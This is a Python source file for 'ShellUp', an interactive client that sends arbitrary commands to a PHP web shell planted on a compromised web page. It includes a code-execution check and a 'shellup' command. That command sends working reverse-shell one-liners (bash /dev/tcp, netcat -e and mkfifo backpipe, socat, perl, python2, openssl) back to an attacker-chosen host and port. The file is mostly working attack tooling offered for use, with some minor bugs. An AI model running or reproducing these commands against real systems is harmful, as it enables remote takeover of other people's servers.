#!/usr/bin/env python3
"""
    ShellUp is a means to communicate with a php script without having to
    open up burp suite to issue commands.

    It assumes the following is in place on whatever php script you were able to write:

    <?php system($_GET['cmd']); ?>
"""

import requests
import socket
import argparse
import random
import string
import cmd
import sys


def randomString(stringLength=20):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def invoke_command(url, invoke_word, cmd, shelltype="bash", proxy_string=""):
    """
    connects to the URL, sends a message through the affected parameter
    """
    if len(proxy_string):
        # This assumes the string is something like
        # http://localhost:8080
        try:
            protocol = proxy_string.split(":", 1)
            proxies = {protocol[0]: proxy_string}

        except ValueError:
            # Invalid proxy string, will figure out
            # how to best handle this another time
            proxy_string = ""

    rstring = randomString()
    prefix = f"{rstring}_BEGIN"
    suffix = f"{rstring}_END"
    shell_separators = {
        'cmd': '&',
        'bash': ';',
    }

    wrapped_command = f"echo {'-n' if shelltype == 'bash' else ''} {prefix}{shell_separators[shelltype]} {cmd} "\
                      f"{shell_separators[shelltype]} echo {'-n' if shelltype == 'bash' else ''} {suffix}"
    payload = { invoke_word: wrapped_command }
    if len(proxy_string):
        try:
            r = requests.get(url, params=payload, proxies=proxies)
        except requests.exceptions.ProxyError:
            return f"PROXY ERROR! Is there a proxy listening on {proxy_string}?"
    else:
        r = requests.get(url, params=payload)
    if prefix in r.text:
        split_left, split_right = r.text.split(prefix)
        content, split_remainder = split_right.split(suffix)
        return content

    return None

def test_for_code_exec(url, invoke_word, shelltype="bash", proxy_string=""):
    """
    Utilizes the "invoke_command" function to run a simple test
    to determine if we have code execution. Currently only works
    for linux and bash, which is kinda typical.

    TODO: Add TFCE for various shells based on the configure shelltype.
    Currently this works because the double amp (&&) will be interpreted
    the same way on cmd.exe and bash.
    """
    test_string = randomString()
    test_var = randomString()
    if shelltype == "cmd":
        cmd_string = f"cmd /v /c \"set tfce{test_var}={test_string} & echo !tfce{test_var}!\""
    else:
        cmd_string = f"export tfce{test_var}={test_string} && echo $tfce{test_var}"

    result = invoke_command(url=url, invoke_word=invoke_word, cmd=cmd_string, shelltype=shelltype, proxy_string=proxy_string)
    if result is None:
        return False
    if test_string in result:
        return True
    return False

def check_for_binary(url, invoke_word, binary, shelltype="bash", proxy_string=""):
    """
    Utilizes the "invoke_command" function to run a simple test
    to determine if a binary exists in our path, returns the path
    if it exists, NoneType if it does not.
    """
    if shelltype == "cmd":
        # if windows
        cmd_string = f"where {binary}"
    else:
        # otherwise bash
        cmd_string = f"which {binary}"

    result = invoke_command(url=url, invoke_word=invoke_word, cmd=cmd_string, shelltype=shelltype, proxy_string=proxy_string)
    if result is None:
        return False
    if "INFO: Could not find" in result:
        # cmd error result
        return False
    if binary in result:
        return result.strip()
    return None

class Terminal(cmd.Cmd):
    prompt = "Command => "

    def __init__(self, target, invoke_word, lhost, lport, proxy, shelltype):
        super().__init__()
        self.target = target
        self.invoke_word = invoke_word
        self.lhost = lhost
        self.lport = lport
        self.proxy_string = proxy
        self.shelltype = shelltype

    def default(self, args):
        output = invoke_command(self.target, self.invoke_word, args, shelltype=self.shelltype, proxy_string=self.proxy_string)
        if output is None:
            print("No output!")
        else:
            print(output)
    
    def do_exit(self, args):
        """
        Exits the program.
        """
        print("Exiting.")
        sys.exit(0)
    
    def do_check(self, args):
        """
        Checks for code execution. Makes no changes, just sets variable in memory and attempts to
        echo its contents.
        """
        if test_for_code_exec(self.target, self.invoke_word, proxy_string=self.proxy_string):
            print("Test succeeded!")
        else:
            print("Code Execution test failed!")
            print("This does not mean it didn't work, just that there is no output.")
            print("To check for blind code execution, issue a pingback and listen with tcpdump.")
    
    def do_shellset(self, args):
        """
        Sets options during runtime, so you can change settings without having to
        exit the program.

        usage:  shellset proxy http://localhost:8080
                shellset lhost 10.10.14.21
        
        options:
                proxy <proxy_string>
                Use a proxy. Expected input: http://<ip_or_host>:<port>
            
                lhost <ip_address>|<hostname>
                Set your local IP or hostname for reverse shell callbacks.

                lport <port>
                Set your local port your listener will communicate on.

                invokeword <word>
                Change the invoke word. This is the word that this program will use
                to send arbitrary commands to. IE: target.php?cmd=id, where the invoke
                word here is "cmd"

                target <url>
                Change the target URL. This should be a full URL pointing to the page
                that has the exploitable code on it. IE: http://example.com/pwned.php

                unset <proxy|lhost|lport|invokeword>
                Unsets the value for proxy/lhost/lport/invokeword. Note, target cannot
                be unset! Where else would we send our malicious intent?

                shelltype <bash|cmd>
                By default this will assume you are connecting to a bash shell. If you
                are connecting to a windows shell, be sure to check this so commands
                can be parsed better.
        """
        # cases like this I really wish python had a switch statement...
        # what a mess this is.
        #valid_options = ("proxy", "lhost", "lport", "invokeword", "target")
        try:
            config, value = args.split(" ")
            if config == "proxy":
                self.proxy_string = value
                print(f"Set new proxy: {self.proxy_string}")
            elif config == "lhost":
                self.lhost = value
                print(f"Set new LHOST: {self.lhost}")
            elif config == "lport":
                self.lport = value
                print(f"Set new LPORT: {self.lport}")
            elif config == "invokeword":
                self.invoke_word = value
                print(f"Set new Invoke Word: {self.invoke_word}")
            elif config == "target":
                self.target = value
                print(f"Set new target URL: {self.target}")
            elif config == "shelltype":
                if value in ["cmd", "bash"]:
                    self.shelltype = value
                    print(f"Set shell type to: {self.shelltype}")
                else:
                    print(f"Please select a valid shell type!")
            elif config == "unset":
                if value == "proxy":
                    self.proxy_string = ""
                    print("Successfully unset proxy")
                elif value == "lhost":
                    self.lhost = "127.0.0.1"
                    print(f"Successfully unset LHOST, reset to default of {self.lhost}")
                elif value == "lport":
                    self.lport == 9090
                    print(f"Successfully unset LPORT, reset to default of {self.lport}.")
                elif value == "invokeword":
                    self.invoke_word = "cmd"
                    print(f"Successfully unset invoke word, reset to default of {self.invoke_word}.")
                elif value == "target":
                    print("Cannot unset target! Change this value instead!")
                else:
                    print("Invalid setting")
            else:
                print(f"Unknown config: {config}!")
        except ValueError:
            print("Invalid usage! See shellset help:")
            self.do_help("shellset")

    def do_shellup(self, revshell):
        """
        Will issue a reverse callback using common binaries on the remote system.
        To issue a shellup callback with bash as an example, use:

        shellup bash

        Available shellup types:

        bash -- uses /dev/tcp to connect back. Use nc -lvnp to communicate
        evilnc -- attempts to use netcat with -e flag compiled in, this is rare but useful if it works
        nc -- uses backpipes to connect back. Useful if netcat is installed on the system but not compiled with -e flag
        socat -- uses socat to revsere back. Will need a socat listener to work.
        perl -- uses perl to connect back. Use nc -lvnp to communicate.
        python2 -- uses python2 to connect back. Use nc -lvnp to communicate.
        openssl -- uses openssl to create a secure reverse shell. Needs openssl client-side to communicate.
        """
        revshells = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
        print("Ensure that your listener is working with the following:")
        print(f"Listening IP: {self.lhost}")
        print(f"Listening Port: {self.lport}")
        if revshell in revshells:
            if revshell == 'bash':
                print("Is your listener running? Then you'd better catch it!")
                shell_cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
                invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
            elif revshell == 'evilnc':
                print("Checking if netcat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "nc", shelltype=self.shelltype)
                if binary is None:
                    print("Netcat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    print("Running netcat with assumption that --gapingsecurityhole compile flag is set...")
                    shell_cmd = f"{binary} -e /bin/sh {self.lhost} {self.lport}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
                    print("If you did not receive a callback, it could be that the remote version of netcat")
                    print("is incompatible with the -e flag. Try the regular nc shellup!")
            elif revshell == 'nc':
                print("Checking if netcat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "nc", shelltype=self.shelltype)
                if binary is None:
                    print("Netcat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    print("Running netcat with super secret backpipe technology...")
                    rstring = randomString()
                    shell_cmd = f"rm -f /tmp/backpipe_{rstring};mkfifo /tmp/backpipe_{rstring}; cat /tmp/backpipe_{rstring}|/bin/sh -i 2>&1|{binary} {self.lhost} {self.lport} >/tmp/backpipe_{rstring}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
            elif revshell == 'socat':
                print("Start up a socat listener on your machine with this command:")
                print("socat file:`tty`,raw,echo=0 tcp-listen:{self.lport}")
                print("Checking if socat exists...")
                binary = check_for_binary(self.target, self.invoke_word, "socat", shelltype=self.shelltype)
                if binary is None:
                    print("Socat binary does not exist in PATH!")
                else:
                    print("Binary exists!")
                    shell_cmd = f"{binary} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.lhost}:{self.lport}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
            elif revshell == "perl":
                print("Checking if perl exists...")
                binary = check_for_binary(self.target, self.invoke_word, "perl", shelltype=self.shelltype)
                if binary is None:
                    print("Perl does not exist in PATH!")
                else:
                    print("Perl exists!")
                    shell_cmd = f"{binary} -e 'use Socket;$i=\"{self.lhost}\";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
            elif revshell == "python2":
                print("Checking if python2 exists...")
                binary = check_for_binary(self.target, self.invoke_word, "python2", shelltype=self.shelltype)
                if binary is None:
                    print("Python2 does not exist in PATH!")
                else:
                    print("Python2 exists!")
                    shell_cmd = f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
            elif revshell == "openssl":
                print("Checking if openssl exists...")
                binary = check_for_binary(self.target, self.invoke_word, "openssl", shelltype=self.shelltype)
                if binary is None:
                    print("OpenSSL does not exist in PATH!")
                else:
                    print("OpenSSL exists!")
                    print("Make sure you run the following commands on the client side:")
                    print(f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
                    print("<< hit enter for all defaults >>")
                    print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {self.lport}")
                    rstring = randomString()
                    shell_cmd = f"mkfifo /tmp/backpipe_{rstring}; /bin/bash -I 2>&1 < /tmp/backpipe_{rstring} | {binary} s_client -quiet -connect {self.lhost}:{self.lport} > /tmp/backpipe_{rstring}; rm -f /tmp/backpipe_{rstring}"
                    print("Is your listener running? Then you'd better catch it!")
                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
        else:
            print(f"Please choose a revshell from {revshells}")


def main(t, i, lh, lp, p, st):
    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp, proxy=p, shelltype=st)
    print("Testing first for code execution...")
    if test_for_code_exec(t, i, proxy_string=p, shelltype=st):
        print("We have code execution!")
    else:
        print("Code Execution Test failed, dropping to REPL anyway.")
        print("Check for blind code exec, listen for pingback.")
    
    term.cmdloop()

if __name__ == "__main__":
    ip_address = socket.gethostbyname(socket.getfqdn())
    parser = argparse.ArgumentParser(description="This app will interact with a compromised webpage.")
    parser.add_argument("url", help="Enter the page you want to connect to, preceeded with http/https.")

    parser.add_argument("-lh", "--lhost",
                        action="store",
                        dest="lhost",
                        default=ip_address,
                        help=f"Enter your local IP address visible to target, defaults to {ip_address}")

    parser.add_argument("-i", "--invoke",
                        action="store",
                        dest="invoke",
                        help="Enter invoke word (ie: ?cmd=whoami, where invoke word is 'cmd', defaults to cmd)",
                        default="cmd")

    parser.add_argument("-lp", "--lport",
                        action="store",
                        dest="lport",
                        help="Enter the local port, defaults to 9090",
                        default=9090)

    parser.add_argument("-p", "--proxy",
                        action="store",
                        default="",
                        dest="proxy",
                        help="to use a proxy, add IP:PORT, ex: -p 127.0.0.1:8080")

    parser.add_argument("-t", "--shelltype",
                        action="store",
                        default="bash",
                        dest="shelltype",
                        help="What shell are we interacting with? Default bash, otherwise cmd")
    args = parser.parse_args()

    if args.shelltype not in ["cmd", "bash"]:
        print("Please choose either cmd or bash as the shelltype! Defaults to bash.")
    else:
        main(t=args.url, i=args.invoke, lh=args.lhost, lp=args.lport, p=args.proxy, st=args.shelltype)
